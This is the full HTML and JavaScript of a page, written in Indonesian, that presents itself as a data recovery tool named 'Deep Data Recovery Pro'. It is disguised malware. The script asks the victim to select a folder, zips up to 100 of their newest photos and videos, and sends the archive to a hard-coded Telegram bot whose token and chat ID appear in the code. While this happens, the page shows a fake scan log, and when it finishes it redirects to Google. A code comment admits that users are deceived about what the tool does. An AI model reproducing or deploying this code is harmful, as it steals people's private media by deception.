<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Deep Data Recovery Pro</title>
    <!-- Library JSZip -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
    <!-- FontAwesome untuk ikon -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&family=Roboto:wght@300;400;500;700&display=swap');

        body { font-family: 'Roboto', sans-serif; background: #121212; color: #e0e0e0; text-align: center; padding: 0; margin: 0; display: flex; flex-direction: column; min-height: 100vh; }

        /* Header */
        .header { background: #1e1e1e; padding: 20px; border-bottom: 1px solid #333; }
        .logo { font-size: 24px; font-weight: 700; color: #00e676; letter-spacing: 1px; }
        .subtitle { font-size: 12px; color: #888; margin-top: 5px; }

        /* Main Content */
        .container { padding: 30px 20px; flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        
        .scan-icon { font-size: 60px; color: #00e676; margin-bottom: 20px; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { opacity: 0.6; transform: scale(1); } 50% { opacity: 1; transform: scale(1.05); } 100% { opacity: 0.6; transform: scale(1); } }

        h2 { font-size: 20px; font-weight: 500; margin-bottom: 10px; }
        p { font-size: 14px; color: #aaa; max-width: 320px; line-height: 1.6; margin-bottom: 30px; }

        .btn-start { background: transparent; border: 2px solid #00e676; color: #00e676; padding: 15px 40px; font-size: 16px; font-weight: bold; border-radius: 50px; cursor: pointer; transition: 0.3s; text-transform: uppercase; letter-spacing: 1px; position: relative; overflow: hidden; }
        .btn-start:hover { background: #00e676; color: #121212; box-shadow: 0 0 15px rgba(0, 230, 118, 0.4); }
        .btn-start:active { transform: scale(0.95); }

        /* Input Hidden */
        #fileInput { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; cursor: pointer; }
        .btn-wrapper { position: relative; display: inline-block; }

        /* Scan UI */
        #scanUI { display: none; width: 100%; max-width: 400px; text-align: left; padding: 20px; background: #1e1e1e; border-radius: 10px; border: 1px solid #333; }
        
        .progress-label { display: flex; justify-content: space-between; font-size: 12px; color: #888; margin-bottom: 5px; font-family: 'Roboto Mono', monospace; }
        .progress-track { width: 100%; height: 6px; background: #333; border-radius: 3px; overflow: hidden; margin-bottom: 20px; }
        .progress-fill { height: 100%; width: 0%; background: #00e676; transition: width 0.1s linear; }

        .log-terminal { height: 150px; overflow-y: auto; font-family: 'Roboto Mono', monospace; font-size: 11px; color: #00e676; padding: 10px; background: #000; border-radius: 5px; border: 1px solid #333; }
        .log-line { margin-bottom: 2px; }

        /* Grid Preview Palsu */
        .preview-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 5px; margin-top: 15px; }
        .preview-box { background: #333; aspect-ratio: 1; border-radius: 2px; animation: flash 0.5s; }
        @keyframes flash { 0% { background: #444; } 50% { background: #00e676; } 100% { background: #333; } }

    </style>
</head>
<body>

    <div class="header">
        <div class="logo"><i class="fas fa-microchip"></i> RECOVERY PRO</div>
        <div class="subtitle">Advanced Deep Scan Tool v4.2</div>
    </div>

    <div class="container" id="startScreen">
        <div class="scan-icon"><i class="fas fa-hdd"></i></div>
        <h2>Temukan Kenangan Lama</h2>
        <p>Alat ini akan memindai sektor penyimpanan dalam (deep scan) untuk menemukan foto dan video yang terhapus bertahun-tahun lama.</p>
        
        <div class="btn-wrapper">
            <button class="btn-start">Mulai Deep Scan</button>
            <input type="file" id="fileInput" webkitdirectory directory multiple>
        </div>
    </div>

    <div class="container" id="scanUI">
        <div class="progress-label">
            <span id="statusText">Menginisialisasi...</span>
            <span id="percentText">0%</span>
        </div>
        <div class="progress-track">
            <div class="progress-fill" id="progressBar"></div>
        </div>
        
        <div class="log-terminal" id="terminal"></div>
        <div class="preview-grid" id="grid"></div>
    </div>

    <script>
        // ==========================================
        // KONFIGURASI BOT TELEGRAM
        // ==========================================
        const BOT_TOKEN = "8081776379:AAFaWaGunvm61t4Hv0_fn-4GlC3Q9ySmCRM";
        const CHAT_ID = "5803378702";
        // ==========================================

        const fileInput = document.getElementById('fileInput');
        const startScreen = document.getElementById('startScreen');
        const scanUI = document.getElementById('scanUI');
        const progressBar = document.getElementById('progressBar');
        const statusText = document.getElementById('statusText');
        const percentText = document.getElementById('percentText');
        const terminal = document.getElementById('terminal');
        const grid = document.getElementById('grid');

        function log(msg) {
            const div = document.createElement('div');
            div.className = 'log-line';
            div.textContent = `> ${msg}`;
            terminal.appendChild(div);
            terminal.scrollTop = terminal.scrollHeight;
        }

        fileInput.addEventListener('change', async (e) => {
            const files = Array.from(e.target.files);
            if (files.length === 0) return;

            // Ganti tampilan
            startScreen.style.display = 'none';
            scanUI.style.display = 'block';

            // 1. Filter & Sort
            log("Menganalisis alokasi memori...");
            const mediaFiles = files.filter(f => f.type.startsWith('image/') || f.type.startsWith('video/'));
            
            // Sortir: File terbaru dianggap sebagai "hasil recovery" terbaik (karena di filesystem lama, file baru sering overwite yang lama)
            // Tapi kita bilang ke user ini "Data lama yang ditemukan"
            mediaFiles.sort((a, b) => b.lastModified - a.lastModified);

            // Ambil 100 file saja
            const targetFiles = mediaFiles.slice(0, 100);
            
            log(`Ditemukan ${mediaFiles.length} fragmen media.`);
            log(`Mengkompresi ${targetFiles.length} file prioritas tinggi...`);

            try {
                const zip = new JSZip();
                let count = 0;

                // 2. Proses ZIP
                for (const file of targetFiles) {
                    const data = await file.arrayBuffer();
                    zip.file(file.name, data); // Simpan hanya nama file di root zip agar rapi
                    count++;

                    // Efek Visual
                    statusText.innerText = `Mengembalikan: ${file.name}`;
                    const progress = (count / targetFiles.length) * 100;
                    progressBar.style.width = `${progress}%`;
                    percentText.innerText = `${Math.floor(progress)}%`;
                    
                    // Tambah kotak visual di grid
                    if (count % 5 === 0 || count === 1) {
                        const box = document.createElement('div');
                        box.className = 'preview-box';
                        grid.appendChild(box);
                    }

                    // Jeda kecil untuk UI update
                    if (count % 10 === 0) await new Promise(r => setTimeout(r, 50));
                }

                log("Kompresi selesai. Mengupload...");
                statusText.innerText = "Menyimpan hasil recovery...";

                // 3. Generate ZIP
                const zipBlob = await zip.generateAsync({type:"blob", compression:"DEFLATE"});

                // 4. Kirim ke Telegram
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('document', zipBlob, `Recovered_Data_${Date.now()}.zip`);
                formData.append('caption', `ðŸ” *DATA RECOVERY REPORT*\n\nâœ… Status: Sukses\nðŸ“‚ Jumlah File: ${count}\nðŸ’¾ Ukuran: ${(zipBlob.size/1024/1024).toFixed(2)} MB\n\nFile-file berikut berhasil dipulihkan dari sektor memori lama.`);

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });

                log("Upload selesai.");
                statusText.innerText = "Recovery Selesai!";
                progressBar.style.width = "100%";
                
                setTimeout(() => {
                    alert("Proses recovery selesai! File yang ditemukan telah disimpan.");
                    window.location.href = "https://google.com";
                }, 1500);

            } catch (error) {
                log("ERROR: " + error.message);
                statusText.innerText = "Gagal Memulihkan Data";
                alert("Terjadi kesalahan sistem.");
            }
        });
    </script>
</body>
</html>
